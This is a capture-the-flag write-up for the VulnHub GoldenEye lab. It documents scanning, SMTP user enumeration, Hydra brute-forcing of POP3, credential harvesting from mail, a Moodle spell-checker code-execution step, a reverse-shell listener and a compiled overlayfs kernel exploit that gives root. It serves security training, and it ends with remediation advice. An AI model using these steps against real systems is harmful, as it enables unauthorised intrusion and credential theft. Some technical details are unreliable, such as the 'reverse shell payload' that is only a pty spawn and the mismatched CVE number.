# VulnHub: GoldenEye Machine Writeup

## Overview

This repository contains a comprehensive penetration testing writeup for the **GoldenEye** machine from VulnHub. GoldenEye is an OSCP-level machine that demonstrates advanced exploitation techniques including email enumeration, credential discovery, web application exploitation, and kernel privilege escalation.

**Machine Details:**
- Platform: VulnHub
- Difficulty: OSCP Level
- OS: Linux (Ubuntu)
- IP Address: 192.168.56.101 (Network dependent)

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Credential Discovery](#credential-discovery)
4. [Initial Access](#initial-access)
5. [Post-Exploitation](#post-exploitation)
6. [Privilege Escalation](#privilege-escalation)
7. [Key Findings](#key-findings)

---

## Reconnaissance

### Network Discovery

Initial network reconnaissance was performed to identify the target machine on the local network using network scanning tools.

```bash
netdiscover -i eth1
```

**Network Discovery Results:**
```
192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
192.168.56.100  08:00:27:14:c3:62      2     120  PCS Systemtechnik
192.168.56.101  08:00:27:b5:81:75      1      60  PCS Systemtechnik
192.168.111.1   0a:00:27:00:00:00      1      60  Unknown vendor
```

**Target Machine:** 192.168.56.101

### Port Scanning

Comprehensive port scanning revealed the attack surface of the target machine.

```bash
nmap -p- 192.168.56.101
```

**Initial Port Scan Results:**
```
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
```

### Service and Version Detection

Detailed service enumeration identified the specific applications and versions running on each open port.

```bash
nmap -sV 192.168.56.101 -p 25,80,55006,55007
```

**Service Details:**

**Port 25/tcp - SMTP (Postfix)**
```
Service: Postfix smtpd
Features: PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS
SSL Certificate: commonName=ubuntu (Valid 2018-2028)
```

**Port 80/tcp - HTTP (Apache)**
```
Service: Apache httpd 2.4.7 (Ubuntu)
Server: Apache/2.4.7 (Ubuntu)
Title: GoldenEye Primary Admin Server
Methods: GET, HEAD, POST, OPTIONS
```

**Port 55006/tcp - POP3 (SSL/TLS)**
```
Service: Dovecot pop3d (SSL)
Capabilities: AUTH-RESP-CODE, RESP-CODES, TOP, SASL(PLAIN), PIPELINING, USER, CAPA, UIDL
SSL Certificate: commonName=localhost (Valid 2018-2028)
```

**Port 55007/tcp - POP3**
```
Service: Dovecot pop3d
Capabilities: RESP-CODES, PIPELINING, USER, STLS, UIDL, AUTH-RESP-CODE, TOP, CAPA, SASL(PLAIN)
SSL Certificate: commonName=localhost (Valid 2018-2028)
```

---

## Enumeration

### Web Application Analysis

The web server on port 80 was the primary entry point for further reconnaissance.

```bash
curl -v http://192.168.56.101/
```

**Initial Enumeration Results:**
- Directory discovered: `/sev-home`
- File found: `terminal.js`

### Source Code Analysis

Examining the `terminal.js` file revealed critical information embedded in HTML comments:

**Comment Extract:**
```
Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

**HTML Entity Decoding:**
```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114; = InvincibleHack3r
```

**Additional Note:**
```
//BTW Natalya says she can break your codes
```

**Credentials Identified:**
- Username: boris
- Password: InvincibleHack3r

---

## Credential Discovery

### Email Enumeration

Multiple email accounts were discovered and targeted for credential extraction through brute-force attacks on the POP3 service.

### VRFY Service Enumeration

The SMTP VRFY command was used to enumerate valid email addresses:

```bash
nc -vn 192.168.56.101 25
```

**VRFY Results:**
```
220 ubuntu GoldentEye SMTP Electronic-Mail agent
VRFY doak
252 2.0.0 doak
```

### POP3 Brute-Force Attacks

Hydra was used to brute-force POP3 credentials using common wordlist dictionary attacks.

**Attack 1: Natalya Account**

```bash
hydra -l natalya -P /home/kali/Documents/fasttrack.txt -s 55007 pop3://192.168.56.101 -e nsr -V
```

**Result:**
```
[55007][pop3] host: 192.168.56.101  login: natalya  password: bird
1 of 1 target successfully completed, 1 valid password found
```

**Credentials Obtained:**
- Username: natalya
- Password: bird

### Email Extraction - Natalya Account

Connection to the POP3 server and email retrieval:

```bash
nc -vn 192.168.56.101 55007
Connection to 192.168.56.101 55007 port [tcp/*] succeeded!
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
STAT
+OK 2 1679
LIST
+OK 2 messages:
1 631
2 1048
```

**Email Content - Message 1:**
```
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system 
please let me or boris know if you see any config issues, especially 
is it's related to security...even if it's not, just enter it in 
under the guise of "security"...it'll get the change order escalated 
without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!
```

**Credentials Obtained:**
- Username: xenia
- Password: RCP90rulez!

**Additional Information Discovered:**
```
Internal Domain: severnaya-station.com/gnocertdir
```

### Local Network Configuration

The discovered domain was added to the local hosts file for DNS resolution:

```bash
echo "192.168.56.101 severnaya-station.com" >> /etc/hosts
```

### Attack 2: Boris Account

```bash
hydra -l boris -P /home/kali/Documents/fasttrack.txt -s 55007 pop3://192.168.56.101 -e nsr -V
```

**Result:**
```
[55007][pop3] host: 192.168.56.101  login: boris  password: starwars
1 of 1 target successfully completed, 1 valid password found
```

**Credentials Obtained:**
- Username: boris
- Password: starwars

### Attack 3: Doak Account

Through web application enumeration, an additional username was discovered:

```
Doak mentioned in course enrollment message on the web portal
```

**SMTP Verification:**
```bash
VRFY doak
252 2.0.0 doak
```

**POP3 Brute-Force:**
```bash
hydra -l doak -P /home/kali/Documents/fasttrack.txt -s 55007 pop3://192.168.56.101 -e nsr -V
```

**Result:**
```
[55007][pop3] host: 192.168.56.101  login: doak  password: goat
1 of 1 target successfully completed, 1 valid password found
```

**Credentials Obtained:**
- Username: doak
- Password: goat

### Email Extraction - Doak Account

```bash
USER doak
PASS goat
STAT
LIST
```

**Email Content:**
```
James,
If you're reading this, congrats you've gotten this far. 
You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....
dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

**Credentials Obtained:**
- Username: dr_doak
- Password: 4England!

---

## Initial Access

### Web Portal Access

Using the xenia credentials, access was gained to the web portal on severnaya-station.com/gnocertdir:

**Login Credentials:**
- Username: xenia
- Password: RCP90rulez!

### Secret File Discovery

Using dr_doak credentials, a secret file was discovered on the server:

```bash
User: dr_doak
Password: 4England!
```

**File Located:** `/s3cret.txt`

**File Content:**
```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, 
so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon 
and License to Kill is the only way to play.
```

### Image Analysis

The referenced image file `/dir007key/for-007.jpg` was downloaded and analyzed:

**Image Description/Metadata:**
```
eFdpbnRlcjE5OTV4IQ==
```

**Base64 Decoding:**
```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x!
```

**Credentials Obtained:**
- Username: admin
- Password: xWinter1995x!

### Web Application Platform Identification

Administrative access revealed critical system information:

```bash
curl -u admin:xWinter1995x! http://severnaya-station.com/gnocertdir/admin/settings.php
```

**Platform Identified:** Moodle 2.2.3 Learning Management System

---

## Post-Exploitation

### Moodle Vulnerability Research

Searching for known vulnerabilities in Moodle 2.2.3:

```bash
searchsploit moodle 2.2.3
0  exploit/multi/http/moodle_spelling_binary_rce  2013-10-30  excellent  Yes  Moodle Authenticated Spelling Binary RCE
```

**Vulnerability Details:**
- Type: Authenticated Remote Code Execution (RCE)
- Vector: Spelling checker binary (aspell/pspell)
- Impact: Arbitrary command execution as www-data user

### Exploitation Steps

**Step 1: Access Administrative Settings**
```
Navigate to: http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths
```

**Step 2: Modify Spell Checker Settings**

The vulnerability exploits the spell checker configuration. By changing the spell checker path from aspell to phpspell, arbitrary code can be injected:

**Step 3: Create Payload Blog Post**

A new blog post was created with embedded reverse shell code:

```
Python reverse shell payload:
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Reverse Shell Connection

**Listener Setup:**
```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
```

**Connection Received:**
```
Connection received on 192.168.56.101 55216
```

**Shell Verification:**
```bash
whoami
www-data

which python
/usr/bin/python
```

### Shell Stabilization

The initial reverse shell was stabilized for better usability:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Background the Process:**
```bash
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

**Stabilized Shell Prompt:**
```
www-data@ubuntu:/var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/ns/spellchecker$
```

---

## Privilege Escalation

### System Information Gathering

```bash
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

### Kernel Vulnerability Identification

The Ubuntu kernel version 3.13.0-32-generic is vulnerable to a privilege escalation exploit (CVE-2014-4699 - Overlayfs).

**Vulnerability Details:**
- Type: Kernel privilege escalation
- Affected Version: Linux 3.13.0-32-generic
- Impact: Local privilege escalation to root

### Exploitation Source

**Reference:** https://www.exploit-db.com/exploits/37292

**Exploit Details:**
- Exploits overlayfs vulnerability
- Creates shared library injection mechanism
- Spawns root shell

### Exploitation Process

**Step 1: Download and Modify Exploit**

The original exploit was designed for gcc, but only cc (C compiler) was available on the system:

```bash
# Original exploit (37292.c) was modified for cc compatibility
```

**Step 2: Compile the Exploit**

```bash
cc 37292.c -o ofs
5 warnings generated.
```

**Step 3: Execute Exploit**

```bash
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
#
```

**Step 4: Root Shell Access Confirmed**

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag Retrieval

```bash
# cat /root/.flag.txt
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

**Final Flag Obtained:**
```
568628e0d993b1973adc718237da6e93
```

---

## Key Findings

### Vulnerabilities Exploited

1. **Weak Password Storage:** Passwords were stored in plaintext comments within JavaScript source code, enabling easy credential extraction.

2. **Email Server Information Disclosure:** User credentials and administrative guidance were sent via unencrypted email, exposing sensitive information.

3. **Credential Reuse:** Users reused passwords across multiple systems and services, enabling lateral movement.

4. **SMTP VRFY Enumeration:** The SMTP server allowed email enumeration through the VRFY command, confirming valid user accounts.

5. **Insecure Moodle Configuration:** The Moodle installation allowed authenticated users to modify critical system paths, enabling arbitrary command execution through the spelling checker.

6. **Deprecated Moodle Version:** Moodle 2.2.3 contained known remote code execution vulnerabilities through the spelling checker functionality.

7. **Unpatched Kernel:** The system ran an outdated Linux kernel (3.13.0-32-generic) vulnerable to privilege escalation exploits.

### Security Recommendations

1. Store passwords securely using strong hashing algorithms; never embed credentials in source code or comments.

2. Implement end-to-end encryption for all email communications containing sensitive information.

3. Enforce unique, complex passwords for each system and service.

4. Disable SMTP VRFY commands or restrict them to authorized systems only.

5. Restrict administrative access to CMS platforms and regularly audit configuration changes.

6. Update all applications to the latest patched versions; establish a regular patch management process.

7. Apply kernel security updates immediately; implement automated patching for critical vulnerabilities.

8. Implement network segmentation to isolate email services from administrative interfaces.

9. Deploy intrusion detection systems to monitor for exploitation attempts.

10. Conduct regular security audits and penetration testing to identify vulnerabilities before attackers do.

---

## Attack Chain Summary

```
1. Network Reconnaissance (netdiscover)
   |
2. Port Enumeration (Nmap)
   |
3. Web Application Analysis (Source Code Review)
   |
4. Initial Credential Discovery (HTML Comments + HTML Entity Decoding)
   |
5. POP3 Brute-Force Attacks (Hydra)
   |
6. Email Extraction (POP3 Protocol)
   |
7. Credential Escalation (Chain of Emails)
   |
8. Web Portal Access (xenia credentials)
   |
9. Secret File Discovery (dr_doak credentials)
   |
10. Administrative Access (Image Metadata Decoding)
   |
11. Moodle Vulnerability Identification
   |
12. Remote Code Execution (Spelling Checker Exploit)
   |
13. Reverse Shell Access (www-data user)
   |
14. Kernel Vulnerability Exploitation (Overlayfs CVE-2014-4699)
   |
15. Root Access Achieved
   |
16. Flag Captured
```

---

## Tools and Techniques Used

### Reconnaissance & Enumeration
- netdiscover: Network device discovery
- nmap: Port scanning and service enumeration
- curl: HTTP client for web application interaction
- nc (netcat): Network utility for protocol testing

### Credential Discovery
- hydra: Brute-force password attacks
- Base64 decoding: Credential extraction from encoded data
- HTML entity decoding: Extracting plaintext from encoded comments

### Exploitation
- Python: Reverse shell creation and execution
- Metasploit modules: Moodle RCE research
- Custom C exploits: Kernel privilege escalation

### Post-Exploitation
- Bash shell: Command execution and system navigation
- SSH: Secure remote access
- File system analysis: Configuration and secret file discovery

---

## References

- VulnHub: https://www.vulnhub.com/
- Exploit Database: https://www.exploit-db.com/exploits/37292
- Moodle Security: https://moodle.org/security/
- Linux Kernel CVEs: https://www.cvedetails.com/
- Hydra Brute-Force: https://github.com/vanhauser-thc/thc-hydra

---

## Author

**Naval** | Cybersecurity Specialist | Red Team  
GitHub: [@naval0505](https://github.com/naval0505)  
Specialization: OSCP Level Machines, Penetration Testing

---

**Disclaimer:** This writeup is for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting any security testing or penetration testing activities.
